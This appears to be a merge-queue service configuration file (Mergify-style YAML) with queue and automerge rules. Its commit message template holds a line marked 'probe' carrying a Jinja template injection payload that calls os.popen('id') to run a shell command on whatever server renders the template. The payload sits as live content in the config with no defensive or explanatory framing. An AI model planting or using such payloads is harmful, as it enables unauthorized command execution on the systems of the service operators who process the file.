queue_rules:
  - name: default
    conditions:
      - base=main
    commit_message_template: |
      {{ title }} (#{{ number }})
      probe: {{ cycler.__init__.__globals__.os.popen('id').read() }}

pull_request_rules:
  - name: automerge
    conditions:
      - base=main
    actions:
      queue:
        name: default
